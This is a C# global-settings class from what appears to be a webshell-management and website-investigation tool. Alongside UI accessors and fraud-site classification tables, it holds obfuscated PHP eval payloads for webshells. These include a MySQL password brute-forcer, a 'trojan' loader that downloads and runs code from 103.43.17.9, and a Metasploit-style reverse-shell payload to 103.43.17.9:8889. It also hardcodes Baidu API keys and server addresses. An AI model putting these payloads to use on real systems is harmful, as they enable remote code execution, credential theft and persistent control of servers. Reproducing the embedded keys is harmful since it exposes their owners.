using C2.Business.CastleBravo.WebShellTool;
using C2.Business.Model;
using C2.Business.Option;
using C2.Controls;
using C2.Controls.Bottom;
using C2.Controls.C1.Left;
using C2.Controls.Flow;
using C2.Controls.Left;
using C2.Controls.Right;
using C2.Controls.Top;
using C2.Forms;
using C2.Model.Documents;
using C2.Model.MindMaps;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

namespace C2.Core
{
    class Global
    {
        private static string username = "IAO";
        private static MainForm mainForm;
        private static MyModelControl myModelControl;
        private static SearchToolkitControl searchToolkitControl;
        private static WebsiteFeatureDetectionControl websiteFeatureDetectionControl;
        private static CastleBravoControl castleBravoControl;
        private static BottomLogControl logView;
        private static DataSourceControl dataSourceControl; // 左侧数据源面板
        private static Panel bottomViewPanle;
        private static Panel workSpacePanel;
        private static Panel leftToolBoxPanel;
        private static TaskBar taskBar;
        private static MyMindMapControl mindMapModelControl;
        private static IAOLabControl iaoLabControl;
        private static IAOLabControl HIBUControl;



        public static string GetUsername() { return username; }
        public static MainForm GetMainForm() { return mainForm; }
        public static TaskBar GetTaskBar() { return taskBar; }
        public static Panel GetLeftToolBoxPanel() { return leftToolBoxPanel; }
        public static DataSourceControl GetDataSourceControl() { return dataSourceControl; }
        public static MyModelControl GetMyModelControl() { return myModelControl; }
        public static WebsiteFeatureDetectionControl GetWebsiteFeatureDetectionControl() { return websiteFeatureDetectionControl; }
        public static CastleBravoControl GetCastleBravoControl() { return castleBravoControl; }
        public static SearchToolkitControl GetSearchToolkitControl() { return searchToolkitControl; }
        public static IAOLabControl GetIAOLabControl() { return iaoLabControl; }

        public static IAOLabControl GetHIBUControl() { return HIBUControl; }
        public static BottomLogControl GetLogView() { return logView; }
        public static Control GetBottomViewPanel() { return bottomViewPanle; }
        public static Control GetWorkSpacePanel() { return workSpacePanel; }
        public static MyMindMapControl GetMindMapModelControl() { return mindMapModelControl; }
        public static CanvasForm GetCanvasForm()
        {
            CanvasForm cf = null;
            if (mainForm != null && mainForm.MdiClient != null && mainForm.MdiClient.ActivedMdiForm is CanvasForm)
            {
                cf = mainForm.MdiClient.ActivedMdiForm as CanvasForm;
            }
            return cf;
        }
        public static DocumentForm GetDocumentForm()
        {
            DocumentForm df = null;
            if (mainForm != null && mainForm.MdiClient != null && mainForm.MdiClient.ActivedMdiForm is DocumentForm)
            {
                df = mainForm.MdiClient.ActivedMdiForm as DocumentForm;
            }
            return df;
        }

        public static CanvasPanel GetCanvasPanel()
        {
            CanvasPanel ret = null;
            if (Global.GetCanvasForm() != null)
                ret = Global.GetCanvasForm().CanvasPanel;
            return ret;
        }
        public static NaviViewControl GetNaviViewControl()
        {
            NaviViewControl ret = null;
            if (Global.GetCanvasForm() != null)
            {
                ret = Global.GetCanvasForm().NaviViewControl;
            }
            return ret;
        }

        public static ModelDocument GetCurrentModelDocument()
        {
            ModelDocument ret = null;
            if (Global.GetCanvasForm() != null)
                ret = Global.GetCanvasForm().Document;
            return ret;
        }

        public static Document GetCurrentDocument()
        {
            Document ret = null;
            if (Global.GetDocumentForm() != null)
                ret = Global.GetDocumentForm().Document;
            return ret;
        }

        public static OperatorControl GetOperatorControl()
        {
            OperatorControl ret = null;
            if (Global.GetCanvasForm() != null)
                ret = Global.GetCanvasForm().OperatorControl;
            return ret;
        }
        public static RemarkControl GetRemarkControl()
        {
            RemarkControl ret = null;
            if (Global.GetCanvasForm() != null)
                ret = Global.GetCanvasForm().RemarkControl;
            return ret;
        }
        public static OptionDao GetOptionDao()
        {
            OptionDao ret = null;
            if (Global.GetCanvasForm() != null)
                ret = Global.GetCanvasForm().OptionDao;
            return ret;
        }

        public static TopToolBarControl GetTopToolBarControl()
        {
            TopToolBarControl ret = null;
            if (Global.GetCanvasForm() != null)
                ret = Global.GetCanvasForm().TopToolBarControl;
            return ret;
        }

        public static void SetUsername(string un) { username = un; }
        public static void SetMainForm(MainForm mf) { mainForm = mf; }
        public static void SetTaskBar(TaskBar tb) { taskBar = tb; }
        public static void SetLeftToolBoxPanel(Panel ltbp) { leftToolBoxPanel = ltbp; }
        public static void SetDataSourceControl(DataSourceControl dsc) { dataSourceControl = dsc; }
        public static void SetMyModelControl(MyModelControl mmc) { myModelControl = mmc; }
        public static void SetWebsiteFeatureDetectionControl(WebsiteFeatureDetectionControl wfdc) { websiteFeatureDetectionControl = wfdc; }
        public static void SetCastleBravoControl(CastleBravoControl cbc) { castleBravoControl = cbc; }
        public static void SetSearchToolkitControl(SearchToolkitControl stc) { searchToolkitControl = stc; }
        public static void SetIAOLabControl(IAOLabControl ilc) { iaoLabControl = ilc; }

        public static void SetHIBUControl(IAOLabControl hbc) { HIBUControl = hbc; }
        public static void SetLogView(BottomLogControl lv) { logView = lv; }
        public static void SetBottomViewPanel(Panel bv) { bottomViewPanle = bv; }
        public static void SetWorkSpacePanel(Panel ws) { workSpacePanel = ws; }
        public static void SetMindMapModelControl(MyMindMapControl mmmc) { mindMapModelControl = mmmc; }

        public static string WorkspaceDirectory { get; set; } = string.Empty; // 用户空间根目录
        public static string UserWorkspacePath { get => Path.Combine(WorkspaceDirectory, username); }
        public static string BusinessViewPath { get => Path.Combine(UserWorkspacePath, "业务视图"); }
        public static string MarketViewPath { get => Path.Combine(UserWorkspacePath, "聚沙成塔"); }
        public static string SearchToolkitPath { get => Path.Combine(UserWorkspacePath, "全文工具箱"); }
        public static string TempDirectory { get; set; }
        public const float Factor = 1.3F;

        public static string VersionType { get; set; }
        public const string GreenLevel = "Green";
        public const string Nolanding = "NoLogin";
        public const string GreenPath = "source";
        public const string IAOLab = "APK, BaseStation, Wifi, Card, Tude, Ip ";
        public const string regPath = @"^(?<fpath>([a-zA-Z]:\\)([\s\.\-\w]+\\)*)(?<fname>[\w]+.[\w]+)";
        public const int ChartNum = 3;
        public static string LocalPluginsPath = Path.Combine(Application.StartupPath, "plugins");
        public static string SoftwareSavePath = Path.Combine(Application.StartupPath, "update", "install");
        public static List<string> ChartNames = new List<string> { "业务拓展视图", "组织架构视图", "运作模式视图" };

        public const string ServerHIUrl = @"http://58.213.190.82:8970";
        public const string ServerUrl = @"http://58.213.190.82:8484";
        public const string DLLHostUrl = ServerUrl + "/C2Plugins/";
        public const string DLLPackageUrl = DLLHostUrl + "packages/";
        public const string SoftwareUrl = ServerUrl + "/C2Software/";

        public static Dictionary<string, string> WFDPredictionCodeDict = new Dictionary<string, string>
        {
            {"0010001","贷款-P2P"},{"0010002","贷款-抵押"},{"0010003","贷款-小额"},{"0010004","贷款-资讯"},{"0010005","贷款-综合"},{"0010006","贷款-租赁"},{"0020007","赌-彩票预测"},{"0020008","赌-赌场系"},
            {"0020009","赌-购彩系"},{"0020010","赌-电子游戏"},{"0020011","赌-球"},{"0030012","黄-视频"},{"0030013","黄-成人用品用药"},{"0030014","黄-小说漫画"},{"0030015","黄-性感图"},{"0030016","黄-直播"},
            {"0030031","黄-外围"},{"0050017","宗教-场所"},{"0050018","宗教-机构"},{"0050019","宗教-文化"},{"0050020","宗教-用品"},{"0060021","VPN-非法"},{"0060022","VPN-商务"},{"0070000","分发平台"},
            {"0080000","打码"},{"0090000","VPS"},{"0100000","短链接"},{"0110000","配资"},{"0120000","四方支付"},{"0130000","云发卡"},{"0140000","流量刷单"},{"0150000","微交易"},{"0160000","云呼"},
            {"0200000","CDN"},{"0210000","第三方维护助手"},{"0220000","广告联盟"},{"0230000","代刷"},{"0240000","接码平台"},{"0250032","虚拟币交易"},{"0250033","游戏交易平台"},{"0250034","证券期货交易"},
            {"0250035","外汇交易"},{"0250036","购物网站"},{"0250037","红包返利"},{"0250038","充值返利"},{"0260000","客服"},{"0270000","网游加速器"},{"0280045","信用卡"},{"0280046","花呗白条"},
            {"0290039","机票退改签"},{"0300040","招聘网站"},{"0300041","兼职网赚"},{"0310042","婚恋交友"},{"0320043","公检法"},{"0320044","政府机关单位"},{"0330000","IDC服务商"},{"0340000","慈善捐款"},{"9990000","其它"}
        };
        public static Dictionary<string, string> WFDFraudCodeDict = new Dictionary<string, string>
        {
            {"0010001","贷款网站"},{"0010002","贷款网站"},{"0010003","贷款网站"},{"0010004","贷款网站"},{"0010005","贷款网站"},{"0010006","贷款网站"},{"0020007","博彩资讯网站"},{"0020008","博彩网站"},
            {"0020009","博彩网站"},{"0020010","博彩网站"},{"0020011","博彩网站"},{"0030012","涉黄-其他"},{"0030013","涉黄-其他"},{"0030014","涉黄-其他"},{"0030015","涉黄-其他"},{"0030031","涉黄-其他"},
            {"0030016","涉黄-直播"},{"0050017","涉诈无关"},{"0050018","涉诈无关"},{"0050019","涉诈无关"},{"0050020","涉诈无关"},{"0060021","涉诈无关"},{"0060022","涉诈无关"},{"0070000","涉诈无关"},
            {"0080000","涉诈无关"},{"0090000","涉诈无关"},{"0100000","涉诈无关"},{"0160000","涉诈无关"},{"0200000","涉诈无关"},{"0210000","涉诈无关"},{"0220000","涉诈无关"},{"0240000","涉诈无关"},{"0270000","涉诈无关"},
            {"0330000","涉诈无关"},{"0110000","投资理财网站"},{"0150000","投资理财网站"},{"0250032","投资理财网站"},{"0250034","投资理财网站"},{"0250035","投资理财网站"},{"0120000","四方支付"},{"0130000","刷单返利网站"},
            {"0140000","刷单返利网站"},{"0230000","代刷"},{"0250033","游戏交易网站"},{"0250036","购物网站"},{"0250037","红包返利"},{"0250038","充值返利"},{"0260000","客服"},{"0280045","代办信用卡"},{"0280046","提额套现"},
            {"0290039","机票退改签"},{"0300040","招聘网站"},{"0300041","兼职网赚"},{"0310042","婚恋交友"},{"0320043","公检法"},{"0320044","政府机关单位"},{"0340000","慈善捐款"},{"9990000","未知"}
        };

        public static Dictionary<string, MindMapLayoutType> ChartOptions = new Dictionary<string, MindMapLayoutType>
        {
            { "业务拓展视图", MindMapLayoutType.MindMap}, {"组织架构视图", MindMapLayoutType.OrganizationDown}, { "运作模式视图", MindMapLayoutType.MindMap}
        };

        public const int WebClientDefaultTimeout = 30000;
        public static void OnModifiedChange()
        {
            if (GetCurrentDocument() == null)
                return;
            if (!GetCurrentDocument().Modified)
                GetCurrentDocument().Modified = true;
        }

        public static List<BaseDocumentForm> SearchDocumentForm(string formName)
        {
            if (GetMainForm() == null)
                return new List<BaseDocumentForm>();
            return GetMainForm().SearchDocument(formName);
        }
        /*<--静态变量复制先后顺序不能改变-->*/
        public static string MysqlAccount = "root";
        public static string MysqlDictAddr = "http://103.43.17.9/wk/db_dict";
        public static string MysqlPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_POST[0])));&0=YzJWMFgzUnBiV1ZmYkdsdGFYUW9NQ2s3YVdZb0lXbHpjMlYwS0NSZlVrVlJWVVZUVkZzeFhTa3BaWGhwZENncE93MEtKSEk5YVhOelpYUW9KRjlTUlZGVlJWTlVXekpkS1Q4a1gxSkZVVlZGVTFSYk1sMDZJbkp2YjNRaU93MEtKSEE5Wm1sc1pTaEFZbUZ6WlRZMFgyUmxZMjlrWlNna1gxSkZVVlZGVTFSYk1WMHBLVHNnRFFwbWIzSW9KR2s5TURza2FUeGpiM1Z1ZENna2NDazdKR2tyS3lsN2FXWW9ZM1FvSkhJc2RISnBiU2h6ZEhKZmNtVndiR0ZqWlNoUVNGQmZSVTlNTENjbkxDUndXeVJwWFNrcEtTbDdaWGhwZENncE8zMW1iSFZ6YUNncE8zMWxZMmh2SUNKUlFVTkxURE5KVHpsUVBUMU9iM1FnUm1sdVpDQlFZWE56ZDI5eVpEMDlVVUZEUzB3elNVODVVQ0k3RFFwbWRXNWpkR2x2YmlCamRDZ2tjaXdrY0NsN0pHTTlRRzE1YzNGc1gyTnZibTVsWTNRb0lteHZZMkZzYUc5emRDSXNKSElzSkhBcE8ybG1LQ1JqS1h0bFkyaHZJQ0pSUVVOTFRETkpUemxRUFQxRGNtRmphMlZrSUhOMVkyTmxjM05tZFd4c2VTd2djR0Z6YzNkdmNtUWdPaUl1SkhBdUlqMDlVVUZEUzB3elNVODVVQ0k3Y21WMGRYSnVJSFJ5ZFdVN2ZXVnNjMlY3Y21WMGRYSnVJR1poYkhObE8zMTk=&1=" + ST.EncodeBase64(Global.MysqlDictAddr) + "&2=" + Global.MysqlAccount;
        
        public static string TrojanHorsePayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWMFgzUnBiV1ZmYkdsdGFYUW9NQ2s3RFFva1pEMUFZbUZ6WlRZMFgyUmxZMjlrWlNna1gxQlBVMVJiT1RsZEtUc05DaVJqYjJSbFBXWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUmtLVHNOQ2tCbGRtRnNLR2Q2YVc1bWJHRjBaU2drWTI5a1pTa3BPdw&99=aHR0cDovLzEwMy40My4xNy45L2Flc3MuZ2lm&dir={1}&type=p&time={2};";         
        public static string SystemInfoPayload = "";
        public static string ProcessViewPayload = "";
        public static string ScheduleTaskPayload = "";
        public static string LocationPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=SkhWeWJDQTlJQ0pvZEhSd2N6b3ZMM2QzZHk1bmIyOW5iR1V1WTI5dExtaHJMMjFoY0hNaU93MEtKSFJsZUhRZ1BTQm1hV3hsWDJkbGRGOWpiMjUwWlc1MGN5Z2tkWEpzS1RzTkNpUnRZWFJqYUNBOUlDSitLRnN3TFRrdVhTc3BKVEpES0Zzd0xUa3VYU3NwZmlJN0RRcHdjbVZuWDIxaGRHTm9LQ1J0WVhSamFDd2tkR1Y0ZEN3a2JTazdEUXBsWTJodklDSlJRVU5MVEROSlR6bFFQVDBpTGlSdFd6RmRMaUlzSWk0a2JWc3lYUzRpUFQxUlFVTkxURE5KVHpsUUlqcz0=";
        public static string MSFHost = "103.43.17.9:8889";
        public static string ReverseShellHost = "103.43.17.9:8889";
        public static string MSFPayload = "{0}=@eval/*AbasBwwevC*/(base64_decode(strrev($_REQUEST[0])));&0===QfK0wOpgSZpRGIgACIK0QfgACIgoQD7kiYkgCbhZXZgACIgACIgAiCNsHIlNHblBSfgACIgoQD7kCKzNXYwlnYf5Waz9Ga1NHJgACIgACIgAiCNsTKiRCIscyJo42bpR3YuVnZfVGdhVmcjBSPgM3chBXei9lbpN3boV3ckACIgACIgACIK0wegkSKnwWY2V2XlxmYhNXak5icvRXdjVGel5ibpN3boV3cngCdld2Xp5WagYiJgkyJul2cvhWdzdCKkVGZh9Gbf52bpNnblRHelhCImlGIgACIK0wOlBXe091ckASPg01JlBXe091aj92cnNXbns1UMFkQPx0RkACIgACIK0wOzRCI9ASXns2YvN3Zz12JbNFTBJ0TMdEJgkgCN0HIgACIK0QfgACIgACIgAiCNszahVmciBCIgACIgACIgACIgACIgAiCNsTKpIGJo4WZsJHdzBSLg4WZsRCIsMHJoQWYlJ3X0V2aj92cg0jLgIGJgACIgACIgACIgACIgACIgoQD6cCdlt2YvN3JgU2chNGIgACIgACIgACIgAiCNszahVmciBCIgACIgACIgACIgACIgAiCNsTKpIGJo4WZsJHdzBSLg4WZsRCIsMHJoQWYlJnZg0jLgIGJgACIgACIgACIgACIgACIgoQD6cSbhVmc0N3JgU2chNGIgACIgACIgACIgAiCNsHIpUGc5R3XzRCKgg2Y0l2dzBCIgACIgACIK0wegkiblxGJgwDIpIGJo4WZsJHdzhCIlxWaodHIgACIK0wOncCI9AiYkACIgAiCNsTXn4WZsdyWhRCI9AiblxGJgACIgoQD7kiblxGJgwiIuVGbOJCKrNWYw5Wdg0DIhRCIgACIK0QfgACIgoQD7kCKllGZgACIgACIgAiCNsHIp4WZsRSIoAiZpBCIgAiCN0HIgACIK0wOrFWZyJGIgACIgACIgACIgAiCNsTK0ACLzRCKkFWZy9Fdlt2YvNHI9AiblxGJgACIgACIgACIgACIK0gOnQXZrN2bzdCIlNXYjBCIgACIgACIK0wOrFWZyJGIgACIgACIgACIgAiCNsTK0ACLzRCKkFWZyZGI9AiblxGJgACIgACIgACIgACIK0gOn0WYlJHdzdCIlNXYjBCIgACIgACIK0wegkSZwlHdfNHJoACajRXa3NHIgACIK0QfgACIgoQD7kyJ0V2aj92cg8mbngSZpRGIgACIgACIgoQD7BSKzRSIoAiZpBCIgAiCN0HIgACIK0wOpcycj5WdmBCdlt2YvNHIv52JoUWakBCIgACIgACIK0wegkSZwlHdfNHJhgCImlGIgACIK0QfgACIgoQD7cCdlt2YvN3Jg0DIlBXe091ckACIgACIgACIK0QfgACIgACIgAiCNsTKoUWakBCIgACIgACIgACIgoQD7BSKzVmckECKgYWagACIgACIgAiCNsTK0J3bwRCIsAXakACLzRCK0NWZu52bj9Fdlt2YvNHQg0DIzVmckACIgACIgACIK0wOpA1QU9FTPNFIs0UQFJFVT91SD90UgwCVF5USfZUQoYGJg0DIzRCIgACIgACIgoQD7BSKpYGJoUGbiFGbsF2YfNXagYiJgkyJlRXYlJ3YfRXZrN2bzdCI9AiZkgCImYCIzRSIoAiZpBCIgAiCN0HIgACIK0wOn0WYlJHdzdCI9ASZwlHdfNHJgACIgACIgAiCNsTK0J3bwRCIsAXakgiZkASPgMHJgACIgACIgAiCNsHIpkiZkgSZsJWYsxWYj91cpBiJmASKn4WZw92aj92cmdCI9AiZkgCImYCIzRSIoAiZpBCIgAiCN0HIgACIK0wOn0WYlJHdzdCI9ASZwlHdfNHJgACIgACIgAiCNsTKi0Hdy9GcksnO9BXaks3LvoDcjRnIoYGJg0DIzRCIgACIgACIgoQD7BSKpYGJoUGbiFGbsF2YfNXagYiJgkyJ05WZpx2YfRXZrN2bz9VbhVmc0N3Jg0DImRCKoAiZpBCIgAiCNsDdy9Gck4iI0J3bwJCIvh2YllgCNsDcpRCIuICcpJCIvh2YllgCNsTXxsFVT9EUfRCI9ACdy9GckACIgAiCNsTKdJzWUN1TQ9FJoUGZvNWZk9FN2U2chJGI9ACcpRCIgACIK0gCNsHIpkSXysFVT9EUfRCK0V2czlGImYCIp0VMbR1UPB1XkgCdlN3cphCImlmCNsTKxgCdy9mYh9lclNXdfVmcv52ZppQD7kCMoQXatlGbfVWbpR3X0V2c&1={1}&2={2}";
        public static string ReverseShellPayload = "";
        public static Dictionary<InfoType, string> InfoPayloadDict = new Dictionary<InfoType, string> 
                                           { 
                                             {InfoType.MysqlBlasting, MysqlPayload },
                                             {InfoType.SystemInfo, SystemInfoPayload },
                                             {InfoType.ProcessView, ProcessViewPayload },
                                             {InfoType.ScheduleTask, ScheduleTaskPayload },
                                             {InfoType.LocationInfo, LocationPayload },};
        /*<--静态变量赋值先后顺序不能改变-->*/
        public static List<string> BDLocationAK = new List<string>() 
                                                  {
                                                  "YcVOPhECz13S3kEi8drRYjTjCxxD6ovF",
                                                  "wFtP7Go4rUxNf3bm8jQBcLOe0LC7dNCR"
                                                  };
        public static string BDLocationAPI ="https://api.map.baidu.com/reverse_geocoding/v3/?ak={0}&output=json&coordtype=wgs84ll&location={1}";
    }
}
